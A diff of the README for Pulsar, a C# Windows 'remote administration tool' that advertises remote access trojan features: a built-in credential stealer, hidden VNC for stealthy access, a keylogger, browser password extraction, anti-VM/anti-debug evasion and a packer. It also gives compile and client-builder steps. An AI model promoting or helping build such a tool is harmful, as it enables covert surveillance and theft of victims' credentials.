@@ -1,19 +1,37 @@
 # Pulsar
 
-[![Build Status](https://ci.appveyor.com/api/projects/status/5857hfy6r1ltb5f2?svg=true)](https://ci.appveyor.com/project/MaxXor/pulsar)
+![GitHub Actions Build Status](https://img.shields.io/github/actions/workflow/status/Quasar-Continuation/Pulsar/dotnet.yml)
 [![Downloads](https://img.shields.io/github/downloads/Quasar-Continuation/Pulsar/total.svg)](https://github.com/Quasar-Continuation/Pulsar/releases)
 [![License](https://img.shields.io/github/license/Quasar-Continuation/Pulsar.svg)](LICENSE)
+![.NET](https://img.shields.io/badge/.NET-4.5.2%2B-blue)
+![Windows](https://img.shields.io/badge/OS-Windows-blue)
 
-**A Free, Open-Source Remote Administration Tool for Windows**
+> **A Free, Open-Source Remote Administration Tool for Windows**
 
-Pulsar is a lightweight, fast, and powerful remote administration tool written in C#. Whether you're providing user support, handling daily admin tasks, or monitoring employees, Pulsar offers high stability and an intuitive interface—making it your go-to solution for remote administration.
+Pulsar is a lightweight, fast, and powerful remote administration tool written in C#. Whether you're providing user support, handling daily admin tasks, or monitoring endpoints, Pulsar offers high stability and an intuitive interface—making it your go-to solution for remote administration.
 
 ---
 
+## 📖 Table of Contents
+- [Need Help or Suggestions?](#-need-help-or-want-to-offer-suggestions)
+- [Screenshots](#-screenshots)
+- [Key Features](#-key-features)
+- [Download](#-download)
+- [Getting Started](#-getting-started)
+- [Supported Platforms](#-supported-platforms)
+- [How to Compile](#-how-to-compile)
+- [Contributing](#-contributing)
+- [Roadmap](#-roadmap)
+- [License](#-license)
+- [Contributors](#-contributors)
+- [Security Notice](#-security-notice)
+- [Thank You](#-thank-you)
+
+---
 
 ## 📚 Need Help or Want to Offer Suggestions?
 
-Check out our [telegram channel](https://t.me/SomaliDevs) that contains all current updates of what the devs are working on + the discussion channel!
+Join our [Telegram channel](https://t.me/SomaliDevs) for updates, discussions, and support from the development team and community.
 
 ---
 
@@ -27,63 +45,74 @@ Check out our [telegram channel](https://t.me/SomaliDevs) that contains all curr
 
 ## ✨ Key Features
 
-- 🌐 **TCP Network Streams** (IPv4 & IPv6 support)  
-- ⚡ **Fast Serialization** (Protocol Buffers)  
-- 🔒 **Encrypted Communication** (TLS)  
-- 📡 **UPnP Support** (automatic port forwarding)  
-- 🖥️ **HVNC** (Hidden Virtual Network Computing)  
-- 🕵️‍♂️ **Kematian Stealer Built-in**  
-- 📋 **Task Manager**  
-- 🗂️ **File Manager**  
-- ⏳ **Startup Manager**  
-- 🖧 **Remote Desktop**  
-- 💻 **Remote Shell**  
-- ⚙️ **Remote Execution**  
-- ℹ️ **System Information**  
-- 🔧 **Registry Editor**  
-- 🔋 **System Power Commands** (Restart, Shutdown, Standby)  
-- ⌨️ **Keylogger** (Unicode Support)  
-- 🌉 **Reverse Proxy** (SOCKS5)  
-- 🔑 **Password Recovery** (Browsers & FTP Clients)  
-- 🔐 **Escalate / De-escalate Permissions**  
-- 🚫 **Block IPs**  
-- 📩 **Telegram Notifications**  
-- 🛡️ **Built-in Obfuscator & Packer**  
-- 🛑 **Anti-VM / Anti-Debug**  
-- 🖼️ **Screen Corrupter / Illuminati**  
+- 🌐 **TCP Network Streams** — IPv4 & IPv6 support for robust connectivity
+- ⚡ **Fast Serialization** — Uses Protocol Buffers for efficient data transfer
+- 🔒 **Encrypted Communication** — Secure TLS encryption for all traffic
+- 📡 **UPnP Support** — Automatic port forwarding for easy setup
+- 🖥️ **HVNC** — Hidden Virtual Network Computing for stealthy remote access
+- 🕵️‍♂️ **Kematian Stealer Built-in** — Integrated credential recovery
+- 📋 **Task Manager** — View and manage remote processes
+- 🗂️ **File Manager** — Browse, upload, and download files remotely
+- ⏳ **Startup Manager** — Control startup programs
+- 🖧 **Remote Desktop** — Full-featured remote desktop control
+- 💻 **Remote Shell** — Command-line access to remote systems
+- ⚙️ **Remote Execution** — Run commands and scripts remotely
+- ℹ️ **System Information** — Gather detailed system info
+- 🔧 **Registry Editor** — Edit the Windows registry remotely
+- 🔋 **System Power Commands** — Restart, shutdown, or standby
+- ⌨️ **Keylogger** — Unicode-supporting keylogger
+- 🌉 **Reverse Proxy** — SOCKS5 proxy support
+- 🔑 **Password Recovery** — Extract browser & FTP client passwords
+- 🔐 **Escalate / De-escalate Permissions** — Manage privilege levels
+- 🚫 **Block IPs** — Block unwanted connections
+- 📩 **Telegram Notifications** — Get alerts via Telegram
+- 🛡️ **Built-in Obfuscator & Packer** — Protect your builds
+- 🛑 **Anti-VM / Anti-Debug** — Evade analysis environments
+- 🖼️ **Screen Corrupter / Illuminati** — Fun/experimental features
 - **…and much more!**
 
 ---
 
 ## 📥 Download
 
-- **[Latest Stable Release](https://github.com/Quasar-Continuation/Pulsar/releases)**  
+- **[Latest Stable Release](https://github.com/Quasar-Continuation/Pulsar/releases)**
 <!-- - **[Latest Development Snapshot](https://ci.appveyor.com/project/MaxXor/pulsar)** -->
+
+---
+
+## 🚀 Getting Started
+
+1. **Download** the latest release from above.
+2. **Extract** the files to a folder of your choice.
+3. **Run** `Pulsar.exe` (server) or build the client as needed.
+4. **Configure** your settings using the built-in client builder.
+
+> **Note:** Pulsar is intended for legitimate administrative and educational use only. Always ensure you have permission to access remote systems.
 
 ---
 
 ## 🖥️ Supported Platforms
 
-- **Runtime:** .NET Framework 4.5.2 or higher  
-- **Operating Systems** (32- and 64-bit):  
-  - Windows 11  
-  - Windows Server 2022  
-  - Windows 10  
-  - Windows Server 2019  
-  - Windows Server 2016  
-  - Windows 8/8.1  
-  - Windows Server 2012  
-  - Windows 7  
-  - Windows Server 2008 R2  
+- **Runtime:** .NET Framework 4.5.2 or higher
+- **Operating Systems** (32- and 64-bit):
+  - Windows 11
+  - Windows Server 2022
+  - Windows 10
+  - Windows Server 2019
+  - Windows Server 2016
+  - Windows 8/8.1
+  - Windows Server 2012
+  - Windows 7
+  - Windows Server 2008 R2
 
 ---
 
 ## 🛠️ How to Compile
 
-1. Open `Pulsar.sln` in **Visual Studio 2019+** with **.NET Desktop Development** installed.  
-2. [Restore NuGet Packages](https://docs.microsoft.com/en-us/nuget/consume-packages/package-restore).  
-3. Build the project (`Build` > `F6`).  
-4. Find executables in the `Bin` directory.  
+1. Open `Pulsar.sln` in **Visual Studio 2019+** with **.NET Desktop Development** installed.
+2. [Restore NuGet Packages](https://docs.microsoft.com/en-us/nuget/consume-packages/package-restore).
+3. Build the project (`Build` > `F6`).
+4. Find executables in the `Bin` directory.
 
 ### Client Build Options
 
@@ -92,11 +121,15 @@ Check out our [telegram channel](https://t.me/SomaliDevs) that contains all curr
 | **Debug**         | Testing         | Uses pre-defined [Settings.cs](/Pulsar.Client/Config/Settings.cs). Edit before compiling. |
 | **Release**       | Production      | Run `Pulsar.exe` and use the client builder for custom settings.           |
 
+> **Troubleshooting:**
+> - Ensure all dependencies are restored via NuGet.
+> - If you encounter build errors, check your .NET Framework version and Visual Studio workloads.
+
 ---
 
 ## 🤝 Contributing
 
-Want to help? See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+Want to help? See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines. All contributions, bug reports, and feature requests are welcome!
 
 ---
 
@@ -106,29 +139,36 @@ Curious about the future? Check out [ROADMAP.md](ROADMAP.md).
 
 ---
 
-
 ## 📜 License
 
-Pulsar is licensed under the **[MIT](LICENSE)**.  
-Third-party licenses are available [here](Licenses).
+Pulsar is licensed under the **[MIT](LICENSE)**. Third-party licenses are available [here](Licenses).
 
 ---
 
 ## 😎 Contributors
 
-- **[KingKDot](https://github.com/KingKDot)** – Lead Developer (very cool)
-- **[Twobit](https://github.com/officialtwobit)** – Multi-Feature Wizard (See PRs)
-- **[Lucky](https://t.me/V_Lucky_V)** – Helped fix major issues with the HVNC 
+- **[KingKDot](https://github.com/KingKDot)** – Lead Developer
+- **[Twobit](https://github.com/officialtwobit)** – Multi-Feature Wizard
+- **[Lucky](https://t.me/V_Lucky_V)** – HVNC Specialist
 - **[fedx](https://github.com/fedx-988)** – README Designer & Discord RPC
-- **[Ace](https://github.com/Knakiri)** – Fixed minor HVNC issues & adding features (i play piano btw) - Also provided some code for WinRE survivial
-- **[Java](https://github.com/JavaRenamed-dev)** - Adding some features
-- **[Body](https://body.sh)** - Added obfuscation (very cool asw trust)
-- **[cpores](https://github.com/vahrervert)** - Added favorites, drawing in VNC, screenoverlay, other stuff (check PRs fr)
-- **[Rishie](https://github.com/rishieissocool)** - Adding Stealer Options + More
-- **[jungsuxx](https://github.com/jungsuxx)** - Fixed a ton of input within HVNC and simplified a lot of the code.
-- **[MOOM aka my lebron](https://github.com/moom825/)** - He didn't directly contribute (making a pr, etc) but his projects are fantastic and we wouldn't have HVNC or force read without him (he deserves all the glaze. He also sort of got me into Batch Obfuscation lol)
+- **[Ace](https://github.com/Knakiri)** – HVNC Features & WinRE Survival
+- **[Java](https://github.com/JavaRenamed-dev)** – Feature Additions
+- **[Body](https://body.sh)** – Obfuscation
+- **[cpores](https://github.com/vahrervert)** – VNC Drawing, Favorites, Overlays
+- **[Rishie](https://github.com/rishieissocool)** – Stealer Options
+- **[jungsuxx](https://github.com/jungsuxx)** – HVNC Input & Code Simplification
+- **[MOOM aka my lebron](https://github.com/moom825/)** – Inspiration & Batch Obfuscation
+
+---
+
+## 🛡️ Security Notice
+
+Pulsar is a powerful tool intended for ethical, authorized use only. Unauthorized use against systems you do not own or have explicit permission to control is illegal and unethical. The developers are not responsible for misuse.
+
 ---
 
 ## 🙏 Thank You!
 
-I really appreciate all kinds of feedback and contributions. Thanks for using and supporting Pulsar!
+We appreciate all feedback and contributions. Thanks for using and supporting Pulsar! \
+\
+Please give me star for hard work 🙏
